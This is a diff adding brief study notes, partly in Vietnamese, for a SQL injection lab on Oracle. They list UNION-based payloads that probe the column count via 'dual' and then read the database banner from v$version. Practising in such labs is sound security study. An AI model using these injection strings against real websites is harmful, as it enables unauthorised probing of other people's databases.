@@ -1,0 +1,10 @@
+Lab: SQL injection attack, querying the database type and version on Oracle
+  target : phải đảm bảo output của payload trùng với số cột của bảng cái mà nằm trên giao diện web
+  payload : 
+    + check số cột : 
+      ' UNION SELECT 'abc' FROM dual--         
+      ' UNION SELECT 'abc','def' FROM dual--
+    + exploit :
+      ' UNION SELECT banner FROM v$version --
+
+      
